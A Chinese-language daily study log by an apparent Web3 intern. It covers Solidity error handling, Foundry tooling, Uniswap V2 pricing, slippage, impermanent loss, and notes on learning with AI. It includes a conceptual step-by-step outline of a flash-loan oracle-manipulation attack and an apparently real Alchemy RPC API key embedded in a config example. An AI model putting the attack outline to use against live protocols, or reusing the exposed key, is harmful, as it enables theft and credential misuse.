---
timezone: UTC+8
---

# mayuxiang

**GitHub ID:** mayuxaing

**Telegram:** @Ma_0xFly

## Self-introduction

Web3 实习计划 2025 冬季实习生

## Notes

<!-- Content_START -->
# 2026-02-03
<!-- DAILY_CHECKIN_2026-02-03_START -->
\## 前端需要显示"所有贡献者的列表"，2种方式：

\### 方式 1：使用事件 + 前端监听（推荐）⭐

你已经有了：

\`\`\`solidity

event Contribution(address indexed contributor, uint256 amount);

emit Contribution(msg.sender, msg.value);

\`\`\`

\*\*前端可以\*\*：

\- 监听所有Contribution事件

\- 从事件日志中提取所有贡献者信息

\- 在前端构建列表

\*\*优点\*\*：不增加合约复杂度和 gas 消耗 \*\*缺点\*\*：依赖前端处理

\### 方式 2：在合约中维护贡献者数组

添加一个数组来跟踪所有贡献者：

solidity

address\[\] public contributors; // 存储所有贡献者地址

然后在 contribute()中：

solidity

\`\`\`solidity

// 如果是首次贡献，加入数组

if (contributions\[msg.sender\] == 0) {

contributors.push(msg.sender);

}

contributions\[msg.sender\] += msg.value;

\`\`\`

\*\*优点\*\*：合约端就能提供完整列表 \*\*缺点\*\*：消耗更多 gas

\## `{value: ...}` 语法：发送 ETH 的方式

\### 基本语法

\`\`\`solidity

接收方.函数名{value: 金额, gas: gas限制}(函数参数)

\`\`\`

\### 📝 实际例子

\`\`\`solidity

fundingRecipient.complete{value: address(this).balance}();

\`\`\`

\*\*解读\*\*：

fundingRecipient- 接收方合约

.complete- 要调用的函数

{value: address(this).balance}

\- () - 函数参数（这里是空的）

\### 🔍 为什么需要 

\`\`\`

{value: ...}

\`\`\`

在 Solidity 中，如果你要调用另一个合约的payable函数

\## 异常处理

\### 为什么是require不是if else

这是一个非常深刻的问题，触及了\*\*区块链与传统编程最大的逻辑区别\*\*。

在传统编程（如 C++、Java、Python）中`if-else` 是用来控制流程的。

但在 Solidity 中`require` 不仅仅是控制流程，它是一个\*\*“带有时间倒流功能的断路器”\*\*。

主要有三个核心原因：\*\*状态回滚（Atomicity）\*\*、\*\*Gas 退款\*\*、\*\*代码防御性\*\*。

\---

\#### 核心原因：原子性与“时间倒流” (State Reversion)

这是最关键的一点。区块链交易必须是\*\*原子的（Atomic）\*\*——要么全成功，要么全失败（什么都没发生）。

\* \*\*使用 `if-else` (软失败)\*\*：

如果你用 `if` 发现条件不对并 `return`，程序停止了，但\*\*之前已经发生的修改\*\*会被保留。

\* _危险场景_：你先扣了用户的钱，然后用 `if` 检查库存，发现没货了，于是 `return`。

\* _结果_：钱扣了，货没给，函数结束了。这是灾难。

\* \*\*使用 `require` (硬回滚)\*\*：

一旦 `require` 失败，EVM 会触发 `REVERT` 操作码。

\* _结果_：它会像按下“Ctrl+Z”一样，\*\*撤销\*\*这笔交易中做过的所有状态修改（包括余额变动、变量赋值）。就像这笔交易从未发生过一样。

\### erro revert为什么比传统的 require String 好

\#### A. 极致的 Gas 节省（最重要原因）

这是核心差异。

\- \*\*传统的写法\*\*：

\`\`\`solidity

// 这种写法很昂贵！

require(block.timestamp >= deadline, "Wait until the deadline has passed");

\`\`\`

\- \*\*原理\*\*：EVM 需要把 `"Wait until the deadline has passed"` 这串长字符串存储在字节码中，并且在报错时通过内存返回。

\- \*\*成本\*\*：字符串越长，Gas 越贵。哪怕是一个字母，都要占空间。

\- \*\*你的写法（Custom Error）\*\*：

\`\`\`solidity

// 定义错误（类似定义一个函数签名）

error TooEarly();

if (block.timestamp < deadline) {

revert TooEarly(); // 这种写法非常便宜！

}

\`\`\`

\- \*\*原理\*\*：EVM 不存字符串。它只存 `TooEarly()` 的哈希值前 4 个字节（Selector）。

\- \*\*成本\*\*：无论错误名字叫 `A()` 还是 `ThisIsAVeryLongErrorName()`，它在运行时只占 \*\*4 个字节\*\*。\*\*这是固定成本，极其便宜。\*\*

\#### B. 支持动态参数（调试神器）

如果你用字符串 `require`，想告诉用户“还要等多久”，你得疯狂拼接字符串（Solidity 拼接字符串非常痛苦且费 Gas）。

但在 `revert` 中，你可以像传函数参数一样传值：

Solidity

\`\`\`

// 定义带参数的错误

error TooEarly(uint256 currentTime, uint256 deadline);

if (block.timestamp < deadline) {

// 直接把数据抛出去，前端能收到具体数值！

revert TooEarly(block.timestamp, deadline);

}

\`\`\`

前端或者区块链浏览器会收到`TooEarly(1700000000, 1800000000)`。用户瞬间明白：“哦，还要等一亿秒”。

\---

\### 2. 进化史：从 require 到 revert

为了让你更清楚 Web3 开发的演进，请看这个对比：

| \*\*阶段\*\* | \*\*写法\*\* | \*\*评价\*\* | \*\*典型场景\*\* |

| --------------------------- | --------------------------------- | --------- | --------------------------- |

| \*\*石器时代\*\* | `require(cond, "Error String")` | \*\*耗气、笨重\*\* | 快速原型开发、老旧合约 |

| \*\*青铜时代\*\* | `revert("Error String")` | \*\*同上\*\* | 复杂的逻辑分支中手动触发 |

| \*\*黄金时代 \*\* | `if (!cond) revert CustomError()` | \*\*省气、专业\*\* | \*\*当前的行业标准\*\* |

| \*\*未来时代 (Solidity 0.8.26+)\*\* | `require(cond, CustomError())` | \*\*完美\*\* | 最新版编译器支持直接在 require 里用自定义错误 |
<!-- DAILY_CHECKIN_2026-02-03_END -->

# 2026-02-02
<!-- DAILY_CHECKIN_2026-02-02_START -->

了解mcp skill
<!-- DAILY_CHECKIN_2026-02-02_END -->

# 2026-02-01
<!-- DAILY_CHECKIN_2026-02-01_START -->


\# ai辅助思路

\## 实验结果

发现宝藏了。之前我们经常感叹有了 Vibe Coding，初级程序员的未来没了，工作和机会被高级程序员抢走，自己也无法深入学习和跃迁。

Anthropic 最新的实验揭露了几个简单的技巧让任何层级的程序员都可以在 AI 时代快速成长。这个对于任何想要长期从事程序员的人来说，都是必备知识和习惯。

简单的说就是：简单重复已知的功能交给 AI，未知的代码生成后继续跟 AI 交互确保理解其含义。下面详细介绍下实验过程、结果和具体如何交互：

Authropic 的实验是让 52 位初级程序员一起学习一个新的 Python 库 Trio，并且编写两个不同功能的代码和完成测验，越快越好。分为两组，唯一的区别是在学习和完成 Trio task 的时候，一组使用 AI 一组不用。

编写功能会测试开发者的学习 Trio 能力以及编码能力；测验则可以验证开发者是否真正学到了东西，对自身能力的提升。

实验结果展示，在编写功能上，用了 AI 比不用 AI 的仅仅快了 2 分钟。测验成绩上，用 AI 的程序员平均得分 50%，而手工编码平均得分是 67%！

这个结果虽然不具备统计学的意义，可以看到两个信息：1. 对于全新的需求和框架，AI 协助并没有想象中的巨大的效率提升，因为需要学习和设计方案。对于重复性或者熟悉的任务，会有巨大的效率提升。2. 依赖 AI 来解决问题，确实降智。让你不再思考和学习，而是无脑的优化 prompt 或者丢给 AI 解决。这个也是导致程序员在 AI 时代无法提升的核心因素。

但是 AI 组也有得分很高的人，他们根据交互模式分为了低分交互模式和高分交互模式，其中高分交互模式的习惯是带来竞争力的核心关键！

低分交互模式：

1\. 参与者完全依赖 AI 完成任务，速度最快，也没遇到什么问题。 2. 问了少量的问题，之后完全交给 AI。 3. 使用 AI 调试和验证代码，虽然提出很多问题，但是没有自己去试图理解。反而消耗更多时间。

高分交互模式：

2\. 先生成代码，手动复制粘贴到自己的作品，提出后续问题加深理解。使用 AI 来检验自己的理解。 2. 混合代码生成和解释，就是既要求生成代码，同时也把代码进行解释。阅读和理解花了更多时间，但是也理解了代码。 3. 只提出概念性的问题，让 AI 辅助加深理解来完成任务。虽然遇到了很多错误，也独立解决了问题。速度居然仅次于完全 AI 委托模式。（我估计是这样用的开发者本身有不错的底子）

由此可见，AI 辅助工具并不是初级程序员杀手，而是不会在 AI 时代学习成长的初中高级程序员的杀手。总结一下高效成长的几个点：

3\. 尽量只用 AI 生成和处理自己比较熟练和熟悉的东西，这样的效率提升也是最快的。处理新的东西其实也没有很快。 2. 对于未知的代码，增加一个 prompt 让其解释是什么，并且给出自己的理解让其验证。 3. 对于未知的新东西，最佳实践是让 AI 引导你做，然后你来做具体的代码编写和验证。速度并不慢，同时熟悉操作和概念。

很好的思路，我会加入到我的 AI Coding 工具里面，帮大家做这些事情。

最后，我还可以结合个人经验补充两点：

4\. 不只是学习表面的语法和 API，还要从第一性原理拆解到底，把一整块的知识借助 AI 和实战搞清楚。比如学习 CSS 得 display 属性，不要只了解 AI 生成的 display: block; 是什么意思，还要了解 display 的全部属性，然后再了解 CSS 的布局盒模型、Flexbox、Grid 等全新的布局方案，这样慢慢积累就成了专家。

5\. 珍惜每一个奇怪费解的 Bug，彻底搞清楚原因和解决方案最终解决，而不是绕过。这个将为你积累关键的经验。比如我最近在配置 Coolify preview deployment 动态域名的时候，就遇到了集成问题，涉及到了 better-auth、GitHub Auth、Cloudflare 域名和 SSL 等。折腾了半天打算放弃，后来想了下需要继续做，因为这说明我在 Auth、SSL、Cross domain 相关理解存在明显短板，所以无法直接给出精准配置。

\## 总结

这篇文章（Bruce Xu 对 Anthropic 实验的解读）的核心观点只有一句话：\*\*AI 本身不会毁掉程序员，真正毁掉你的是“把 AI 当 crutches（拐杖）用，而不是当放大器/老师用”\*\*。

实验最扎心的结论是：盲目依赖 AI → 写代码快一点点，但真正理解和长期能力大幅下降（测验分数从 67% 掉到 50%，尤其调试能力崩得最厉害）。而用得好的人反而能又快又学得深——关键区别就在交互方式。

文章真正想让你做的事（可执行的行动指南）按优先级排序，照着练就行：

1\. 把“已知/重复/熟练”的部分大胆丢给 AI

→ 这是效率最高的地方，别自己手敲 http client、json 解析、 boilerplate、CRUD 等

→ 省下来的脑力留给真正陌生的部分

2\. 遇到“全新/不熟悉”的东西时，绝不要直接 copy → paste → run 完事

改成下面三种高分模式之一（选你最顺手的，坚持用 2–3 周就会成习惯）：

\- 模式 A：生成 → 强迫理解（最常用）

1\. 让 AI 生成代码

2\. 手动 复制到你的项目

3\. 立刻追问：

\- “这段代码每一行分别在做什么？”

\- “这个 xxx 参数/方法的核心原理是什么？”

\- “如果我想改成 yyy 场景，应该改哪里？”

\- “你写这段代码时做了哪些假设？”

4\. 自己总结一遍理解（可以用自己的话写注释或发给 AI 验证）

\- 模式 B：生成 + 解释 合体 prompt（省步骤）

一次问：“帮我写 xxx 功能，用 Trio 实现，要求同时详细注释每一行在做什么，以及为什么这么选而不是用 asyncio”

然后还是要自己读 + 再追问不明白的地方

\- 模式 C：只问概念 + 自己写（长期最强，速度第二快）

不让 AI 直接写完整代码，只问：

\- “Trio 的核心思想和 asyncio 相比有什么本质不同？”

\- “在这种场景下应该用 nursery 还是 start\_soon？”

\- “常见的反模式有哪些？”

然后自己动手写，错了再问“为什么这段会死锁/泄漏/性能差？”

→ 错误是最好的老师，AI 帮你快速诊断，但代码要自己敲

3\. 额外两条作者亲身强调的长期动作（强烈建议写进你的开发 checklist）

\- 第一性原理拆解：不要只停在“这个 API 怎么用”，要问“它为什么这么设计 → 底层原理 → 整个领域知识图谱长什么样”

例：别只记 flex: 1，要搞懂 display、box model、containing block、BFC、flex/grid 整体关系

例：别只记 flex: 1，要搞懂显示、盒子模型、包含块、BFC、flex/grid 整体关系

\- 珍惜每一个“恶心”的 bug

千万别 copy 一个 stackoverflow 答案完事，也别让 AI 直接修好就跑

必须搞清楚：根本原因是什么？为什么别人没遇到而我遇到了？这次修好后下次同类问题我能快 10 倍定位吗？

→ 这些才是真正拉开差距的“护城河”

一句话总结你要改变的习惯：从“让 AI 帮我搞定” → 变成“让 AI 陪我一起把这件事搞懂”你接下来 1–2 周可以直接拿正在学的任何新技术/库/框架，按照上面 1+2+3 的方式走一遍，很快就能感受到理解深度和自信心的差别。有具体场景想练的话（比如你现在在学什么库或框架），可以扔过来，我直接帮你写出“高分交互模式”的 prompt 模板。
<!-- DAILY_CHECKIN_2026-02-01_END -->

# 2026-01-31
<!-- DAILY_CHECKIN_2026-01-31_START -->



\- **Hardhat**：如果你喜欢 **JavaScript**，以后想做全栈开发（写前端网页跟合约交互），Hardhat 是必经之路。因为它的测试代码和前端代码很像。

\- **Foundry**：如果你想做\*\*纯合约开发\*\*，追求极致的速度和像黑客一样的快感，Foundry 是现在的行业新标准。

\# Foundry（偏向合约测试）

理解这三个角色的关系：

1\. **Anvil（铁砧）**：它是游戏服务器。它会在你电脑本地启动一条区块链。只要它开着，你的世界就存在；它关了，世界就消失。

2\. **Forge（锻造）**：它是造物主工具。用来编写和把合约（比如一个自动售货机）放到服务器里。

3\. **Cast（施法）**：它是游戏手柄。用来和合约互动（比如查询余额、按下按钮）。

\## forge

\### 初始化一个项目

\`\`\`plain

forge init my-contract

cd my-contract

\`\`\`

\### 写一个合约

在 `src/` 目录下创建合约

\### 编译合约

\`\`\`solidity

forge build

\`\`\`

\### 启动本地节点

\`\`\`solidity

myx@cs:/mnt/e/Foundry/myproj$ anvil

Available Accounts

\==================

(0) 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 (10000.000000000000000000 ETH)

(1) 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 (10000.000000000000000000 ETH)

(2) 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC (10000.000000000000000000 ETH)

(3) 0x90F79bf6EB2c4f870365E785982E1f101E93b906 (10000.000000000000000000 ETH)

(4) 0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65 (10000.000000000000000000 ETH)

(5) 0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc (10000.000000000000000000 ETH)

(6) 0x976EA74026E726554dB657fA54763abd0C3a0aa9 (10000.000000000000000000 ETH)

(7) 0x14dC79964da2C08b23698B3D3cc7Ca32193d9955 (10000.000000000000000000 ETH)

(8) 0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f (10000.000000000000000000 ETH)

(9) 0xa0Ee7A142d267C1f36714E4a8F75612F20a79720 (10000.000000000000000000 ETH)

Private Keys

\==================

(0) 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

(1) 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

(2) 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a

(3) 0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6

(4) 0x47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f19c30a34926a

(5) 0x8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba

(6) 0x92db14e403b83dfe3df233f83dfa3a0d7096f21ca9b0d6d6b8d88b2b4ec1564e

(7) 0x4bbbf85ce3377467afe5d46f804f221813b2bb87f24d81f60f1fcdbf7cbf4356

(8) 0xdbda1821b80551c9d65939329250298aa3472ba22feea921c0cf5d620ea67b97

(9) 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6

\`\`\`

\### 设置环境变量，部署合约上链

**RPC 就是让程序（Foundry、脚本、工具）连接区块链节点的 URL**。

你要和 Sepolia testnet 通信，就必须有 Sepolia 的 RPC。 用它才能部署合约、发送交易、读区块

\`\`\`bash

//用自己钱包部署到sepolia测试网

export PRIVATE\_KEY=你的私钥

export RPC\_URL=[https://eth-sepolia.g.alchemy.com/v2/你的APIKEY](https://eth-sepolia.g.alchemy.com/v2/你的APIKEY)

forge script ./script/DeploySimpleStorage.s.sol --broadcast --rpc-url $RPC\_URL --private-key $PRIVATE\_KEY

//anvil本地链模板如下

export PRIVATE\_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

export RPC\_URL=[http://127.0.0.1:8545](http://127.0.0.1:8545)

forge script ./script/DeploySimpleStorage.s.sol --broadcast --rpc-url $RPC\_URL --private-key $PRIVATE\_KEY

\`\`\`

\### 测试

\`\`\`solidity

forge test --match-path ./test/unstoppable/Unstoppable.t.sol -vv //运行指定测试合约

forge test -vv //只有一个测试文件直接

forge test --match-test 函数 -vv //测试单个函数

\`\`\`

因为 **Foundry 的测试会自动读取 test 中的脚本，但所有合约逻辑仍然来自 src 文件夹。**

换句话说：

\+ **src/** 里是你要审计 / 攻击 / 部署的真实合约

\+ **test/** 里是 Foundry 自动部署 src 合约、构建攻击场景、执行 exploit 的脚本

代码干的事是：

1\. 执行 `test/unstoppable/*.t.sol` 文件

2\. 测试脚本内部

\- 使用 **src 里的 UnstoppableLender.sol / DamnValuableToken.sol**

\- 然后自动部署它们

\- 自动设置初始状态

\- 自动运行 exploit

3\. 最后验证 challenge 是否被解掉

\#### 测试模式

\##### Fork Test（分叉测试）

**Fork Test = 基于真实链状态的本地 EVM 沙箱。**

Foundry 允许你从主网/测试网某个区块高度创建一份“链状态快照”，然后在本地执行交易。

换句话说：

\+ **代码在本地跑**

\+ **状态从链上来**

\+ **读是真实的，写是本地的，不影响链上**

\###### 使用

1\. 在 foundry.toml 里写 RPC

\`\`\`solidity

\[rpc\_endpoints\]

sepolianet = "[https://eth-sepolia.g.alchemy.com/v2/DPuDLu\_tUJwkWFmyEsT7x](https://eth-sepolia.g.alchemy.com/v2/DPuDLu_tUJwkWFmyEsT7x)"

\`\`\`

2\. 测试代码中这样调用（注意选择的区块要高最好是最近的，否则有些调用合约不在链上）

\`\`\`solidity

contract FundMeTest is Test {

FundMe fundme;

address constant SEPOLIA\_ETH\_USD = 0x694AA1769357215DE4FAC081bf1f309aDC325306;

function setUp() external { //部署合约

//fork测试

vm.createSelectFork("sepolianet", 9\_000\_000); //fork 到 Sepolia（会从 foundry.toml 里读 rpc\_endpoints.sepolia）

fundme = new FundMe(SEPOLIA\_ETH\_USD);// 2. 用真实的 priceFeed 地址部署 FundMe

}

}

\`\`\`

\#### monk

**Mock = 在测试环境中，用合约模拟真实外部依赖的行为**

特点：

\+ 不访问链上真实合约

\+ 不依赖预言机、治理、多签等外部状态

\+ 可控（返回值可随时设定）

\+ 可预测（不随链上状态变化）

\+ 允许边界条件/攻击场景测试

Web3 测试中常 mock 的组件：

\+ Price Feed（Chainlink AggregatorV3Interface）

\+ ERC20 token

\+ 外部协议接口（Uniswap、Aave、Lido）

\+ Oracle 和跨链模块

适用场景：

**你需要测试自己写的逻辑，而外部依赖本身不是测试重点。**

\## cast

\### cast call 查操作（显示变量值）

\`\`\`bash

调用函数

cast call 合约地址 "变量名()" --rpc-url $RPC\_URL

//可选参数，把数值转化为十进制

cast call 合约地址 "变量名()" --rpc-url $RPC\_URL | cast --to-dec

\`\`\`

\### cast send 调用操作

\`\`\`bash

cast send 合约地址 "函数名(uint256)" 参数 --rpc-url $RPC\_URL --private-key $PRIVATE\_KEY

\`\`\`

\### 例子

\`\`\`bash

myx@cs:~/web3开发/test$ cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "setNumber(uint256)" 666 --rpc-url $RPC\_URL --private-key $PRIVATE\_KEY

blockHash 0x1544600ae1151a5f5e2b51fbda1ccc19a9b51877a3b973404b4682d71ed0be28

blockNumber 4

contractAddress

cumulativeGasUsed 23808

effectiveGasPrice 671353850

from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

gasUsed 23808

logs \[\]

logsBloom 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

root

status 1 (success)

transactionHash 0xe78928c25a291baf8d195df78480172a0359551005f46ccdf001995a4dc60dae

transactionIndex 0

type 2

blobGasPrice 1

blobGasUsed

to 0x5FbDB2315678afecb367f032d93F642f64180aa3

myx@cs:~/web3开发/test$ cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "number()" --rpc-url $RPC\_URL | cast --to-dec

666

\`\`\`
<!-- DAILY_CHECKIN_2026-01-31_END -->

# 2026-01-30
<!-- DAILY_CHECKIN_2026-01-30_START -->




\## 滑点与价格冲击

**滑点**就是：\*\*“你预期的价格”\*\* 和 **“实际成交的更差价格”** 之间的差额。

**“价格冲击” (Price Impact)**：因为你交易量太大、导致价格向你不利方向移动的现象 。

!\[\[图库/48ba090c547fa957826d56cf1be95028\_MD5.jpg\]\]

这就是传说中的 **Uniswap V2 联合曲线 (Bonding Curve)**。这张图不仅仅是一条数学曲线，它是 DeFi 世界的“物理定律”。

\- 绿点 (Start)：

这是我们的初始状态。池子里有 10 ETH 和 20,000 USDT。

($10 \\times 20,000 = 200,000$)

\- 红点 (End)：

这是你刚才“大额买入 5 ETH”后的状态。

你看，为了维持 $k$ 不变，当你把 ETH 的库存从 10 买到剩 5 时，USDT 的库存被迫从 20,000 飙升到了 40,000（你需要支付 20,000 USDT！）。

\- 红色的箭头：

这就是“交易”。

在 Uniswap 里，交易不是握手，而是滑滑梯。

你只是推动池子的状态点，沿着这条光滑的曲线移动。

\- **买入 ETH** = 向左上方移动（ETH 变少，USDT 变多）。

\- **卖出 ETH** = 向右下方移动（ETH 变多，USDT 变少）。

\---

\### 实战算账：深池 vs. 浅池的数值推演

根据你的 Checklist，我们要计算在不同 TVL (Total Value Locked) 下，购买等量资产的惨烈对比。

**场景设定：**

\- **你的任务：** 购买 **10,000 USDT** 等值的 ETH。

\- **当前价格：** 1 ETH = 2,000 USDT。

\#### 🦈 场景 A：浅池子 (Shallow Pool)

\- **池子状态：** 10 ETH + 20,000 USDT ($k = 200,000$)。

\- **池子总价值：** $40,000 (Very Low)

\- **你的行为：** 投入 **10,000 USDT** 购买 ETH。

**计算：**

1\. **投入前：** $y = 20,000$。

2\. **投入后：** $y\_{new} = 30,000$。

3\. **新的 ETH 余额：** $x\_{new} = k / 30,000 = 200,000 / 30,000 = 6.66$ ETH。

4\. **你买到的 ETH：** $10 - 6.66 = \\mathbf{3.33\\ ETH}$。

5\. **实际成交价：** $10,000 / 3.33 = \\mathbf{3,003\\ USDT/ETH}$。

6\. **价格冲击：** $(3003 - 2000) / 2000 \\approx \\mathbf{50\\%}$。

\- _你直接把价格买崩了 50%！亏损一半本金。_

\#### 🐋 场景 B：深池子 (Deep Pool)

\- **池子状态：** 10,000 ETH + 20,000,000 USDT ($k = 2 \\times 10^{11}$)。

\- **池子总价值：** $40,000,000 (High)

\- **你的行为：** 投入 **10,000 USDT** 购买 ETH。

**计算：**

1\. **投入前：** $y = 20,000,000$。

2\. **投入后：** $y\_{new} = 20,010,000$。

3\. **新的 ETH 余额：** $x\_{new} = k / 20,010,000 \\approx 9,995.002$ ETH。

4\. **你买到的 ETH：** $10,000 - 9,995.002 = \\mathbf{4.998\\ ETH}$。

5\. **实际成交价：** $10,000 / 4.998 \\approx \\mathbf{2,000.8\\ USDT/ETH}$。

6\. **价格冲击：** $(2000.8 - 2000) / 2000 = \\mathbf{0.04\\%}$。

\- _几乎无感。_

\---

\### 安全工程师的“黑暗森林”视角

为什么要特意算这个？因为 **Flash Loan (闪电贷)**。

黑客没有几千万美金的本金，但他可以借。

如果黑客借来 1 亿美金，对着一个中等深度的池子（比如某个山寨币池子）砸进去：

1\. **制造价格冲击：** 瞬间把价格从 $1 拉升到 $100。

2\. **外部获利：** 在另一个借贷协议（比如 Aave 的分叉版）里，用这个山寨币做抵押。

3\. **借贷协议的预言机**看到了 Uniswap 的价格 $100，误以为这个币很值钱。

4\. **借空资金：** 允许黑客借出巨额的 ETH/USDT。

5\. **跑路：** 黑客还掉闪电贷，带着借出来的真金白银消失。

这就是 **Oracle Manipulation Attack** 的核心原理：\*\*利用资金量制造 Price Impact，扭曲现实。\*\*  
  
\### Code Anchor: `getAmountsOut`

在代码里，Router 合约会帮你计算这笔账。作为开发者，你必须知道这个函数。

\`\`\`Solidity

// UniswapV2Router02.sol

function getAmountsOut(uint amountIn, address\[\] memory path)

public

view

returns (uint\[\] memory amounts)

{

// ... 前置逻辑 ...

// 这里就是核心：根据输入金额，递归计算能换出多少钱

// 它使用的是 getAmountOut 函数（基于 xy=k）

for (uint i; i < path.length - 1; i++) {

(uint reserveIn, uint reserveOut) = getReserves(path\[i\], path\[i + 1\]);

amounts\[i + 1\] = getAmountOut(amounts\[i\], reserveIn, reserveOut);

}

}

\`\`\`

安全审计点：

如果一个 DeFi 协议直接依赖 getAmountsOut 的返回值作为“价格预言机”，那么它100% 会被黑掉。因为 getAmountsOut 反映的是当前瞬间的价格，极易被闪电贷操纵。
<!-- DAILY_CHECKIN_2026-01-30_END -->

# 2026-01-29
<!-- DAILY_CHECKIN_2026-01-29_START -->





\### 3.实战模拟

**场景设定：**

\- **池底 (Reserves)：** 10 ETH ($x$) + 20,000 USDT ($y$)

\- **初始价格 (Spot Price)：** $20,000 / 10 = 2,000$ USDT/ETH

\- **任务：** 你想\*\*买入 1 ETH\*\* (把池子里的 ETH 变成 9 个)，你需要支付多少 USDT？

**计算过程 (Excel 逻辑)：**

1\. 目标状态：

池子里的 ETH 必须从 $10$ 变成 $9$。

$$New\\\_ETH\\\_Reserve = 9$$

2\. 计算新的 $k$ 值 (简化版，先忽略手续费)：

$$k = 10 \\times 20,000 = 200,000$$

3\. 计算池子需要多少 USDT 才能平衡 $k$：

$$New\\\_USDT\\\_Reserve = \\frac{k}{New\\\_ETH\\\_Reserve} = \\frac{200,000}{9} = 22,222.22...$$

4\. 计算你需要支付的 USDT：

$$Input = New\\\_USDT\\\_Reserve - Old\\\_USDT\\\_Reserve$$

$$Input = 22,222.22 - 20,000 = \\mathbf{2,222.22\\ USDT}$$

**👨‍💻 架构师分析：**

\- **理论价格：** 买 1 ETH 应该只要 2,000 USDT。

\- **实际支付：** 2,222.22 USDT。

\- **差价：** 222.22 USDT。

\- **结论：** 仅仅买入池子 10% 的流动性，你就承受了 **11.1% 的价格冲击**！

\- 这就是为什么大资金不能在小池子交易。

\- 这也是攻击者如何通过“闪电贷”瞬间抽干流动性，人为制造出极其离谱的价格（例如把 USDT 价格拉到 $100），从而去攻击依赖这个价格的借贷协议（预言机操纵攻击）。

\## 流动性与 LP Token

在传统世界里，你们会签合同确认股份。但在区块链这个“代码世界”里，没有纸质合同。为了公平地证明每个人在资金池里拥有的“份额”，它会发给你\*\*LP Token\*\* ，LP Token 就是你在资金池里的“股份证明” (Share)。

\## 无偿损失(Impermanent Loss, IL)

\### 1. 核心类比：消息闭塞的店主

为了理解 IL，我们再次请出我们的 **Uniswap 自动售货机**。

\- **场景：** 你是自动售货机的老板（LP）。你在机器里放了 **Apple (ETH)** 和 **Cash (USDT)**。

\- **设定：** 你的机器\*\*没有联网\*\*。它不知道外面世界苹果卖多少钱，它只认死理（$x \\cdot y = k$）。

\- **事件：** 外面菜市场（Binance）的苹果价格突然\*\*暴涨\*\*了 50%。

**发生了什么？**

1\. **套利者 (Arbitrageurs)** 发现了机会：你机器里的苹果还卖原来的便宜价！

2\. 他们疯狂地冲过来，把你机器里便宜的苹果买光，塞给你一大堆现金。

3\. 直到把你机器里的苹果价格买得和外面一样贵，他们才停手。

结局：

当你晚上来查账时，发现：

\- **珍贵的苹果 (ETH)** 变少了（被买走了）。

\- **贬值的现金 (USDT)** 变多了（塞给你了）。

\- **总资产：** 虽然现金多了，但因为苹果涨得更猛，如果你当初\*\*根本不开店，直接拿着苹果睡觉 (HODL)\*\*，你现在的总资产其实会更高！

这一部分的\*\*“少赚的钱”\*\*，就是\*\*无常损失\*\*。

\> 💀 简言之：

\>

\> 无常损失的本质，就是你被迫\*\*“低卖高买”\*\*。

\>

\> 当币价上涨时，你自动卖出了表现好的资产（ETH）；当币价下跌时，你自动买入了表现差的资产（ETH）。你总是在做反向操作。

\---

\### 2. 实战算账：HODL vs. LP

我们用数字来证明这一点。这是所有 DeFi 玩家必须算的一笔账。

**初始状态 (Initial)：**

\- **你持有：** 10 ETH + 20,000 USDT

\- **当前市价：** 1 ETH = $2,000

\- **总价值：** $20,000 + $20,000 = **$40,000**

突发事件：

ETH 暴涨至 $4,000 (翻倍)。

\#### 策略 A：拿住不动 (HODL)

如果你没有把钱存进 Uniswap，而是放在钱包里不动：

\- 10 ETH × $4,000 = $40,000

\- 20,000 USDT (不变) = $20,000

\- \*\*总价值：\*\* **$60,000**

\#### 策略 B：提供流动性 (LP)

你把钱存进了 Uniswap。

\- 由于套利者的介入，你的池子比例会变（根据 $x \\cdot y = k$ 自动调整）。

\- 经过计算（为了省事，我直接告诉你结果，公式是 $\\sqrt{k/P}$）：

\- 你的 ETH 会剩下约 **7.07 个** (被买走了 2.93 个)。

\- 你的 USDT 会变成 **28,284 个**。

\- **现在价值：**

\- (7.07 ETH × $4,000) + 28,284 USDT

\- $28,280 + $28,284 = **$56,564**

\#### 惨痛对比

\- **HODL 躺平：** $60,000

\- **辛辛苦苦当 LP：** $56,564

\- **无常损失：** $60,000 - $56,564 = **$3,436** (亏了约 5.7%)

结论：

ETH 涨了，你虽然赚了（从 4万 变成了 5.6万），但你跑输了大盘。如果算上你在做 LP 期间赚的手续费，如果不超过 $3,436，那你其实是亏本的。
<!-- DAILY_CHECKIN_2026-01-29_END -->

# 2026-01-28
<!-- DAILY_CHECKIN_2026-01-28_START -->






Uniswp是一个去中心化交易所，所谓去中心化，可以从以下两个方面理解：

●交易全部是由开源的代码来控制，没有任何人为的因素

●交易所无实际的掌控机构，规则不能够被随便修改

Uniswap V2 是以太坊上最经典的\*\*去中心化交易所 (DEX)\*\* 协议之一。它的核心在于彻底抛弃了传统金融的“订单薄” (Order Book) 模式，转而使用了 **自动做市商 (AMM)** 机制。

简单来说，Uniswap V2 就像一个始终在线的\*\*自动机器人\*\*或\*\*自动售货机\*\*：

\- **没有买家和卖家**：你不是在和另一个人交易。

\- **只有资金池**：你是在和一个装满代币的智能合约（资金池）进行交换。

\- **数学定价**：价格不是由人喊出来的，而是由一个简洁的数学公式 $x \\cdot y = k$ 自动计算出来的。

\## AMM (自动做市商) 基础模型

Uniswap V2 的核心就是一个简单的数学公式，它强制规定了合约内两种资产余额的关系。

